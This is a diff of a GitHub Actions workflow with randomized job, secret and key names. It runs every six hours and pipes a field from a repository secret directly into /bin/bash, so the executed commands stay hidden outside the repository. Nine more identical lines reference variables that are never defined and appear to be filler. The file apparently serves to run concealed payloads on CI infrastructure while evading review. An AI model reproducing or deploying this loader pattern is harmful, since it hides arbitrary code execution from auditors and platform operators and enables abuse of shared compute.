@@ -3,22 +3,24 @@ name: ganbaoda6547
 on:
   workflow_dispatch:
   schedule:
-    - cron: '55 4/6 * * *'
-
-jobs:  # 24112
+    - cron: '17 4/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: ganbaoda6547
         env:
-          izyx4531: ${{ secrets.izyx4531 }}
+          ts15352: ${{ secrets.ts15352 }}
         run: |
-          echo $izyx4531 | jq -r .hg20 | /bin/bash
-          echo $isjg873 | jq -r .eaq7 | /bin/bash
-          echo $xw5 | jq -r .y5 | /bin/bash
-          echo $u489 | jq -r .qxg2 | /bin/bash
-          echo $wuj3161 | jq -r .df9706 | /bin/bash
-          echo $t6 | jq -r .qzozf9 | /bin/bash
-          echo $mylsp5 | jq -r .zsex3 | /bin/bash
+          echo $ts15352 | jq -r .kub69979 | /bin/bash
+          echo $tsts6 | jq -r .hni36 | /bin/bash
+          echo $zoiud46655 | jq -r .in397 | /bin/bash
+          echo $t61 | jq -r .zvzsa610 | /bin/bash
+          echo $n8497 | jq -r .l90 | /bin/bash
+          echo $muf41705 | jq -r .otfzv66 | /bin/bash
+          echo $iznt168 | jq -r .gg7826 | /bin/bash
+          echo $evaw33195 | jq -r .pjkbk493 | /bin/bash
+          echo $pgegf6424 | jq -r .m9958 | /bin/bash
+          echo $g532 | jq -r .igx689 | /bin/bash
 
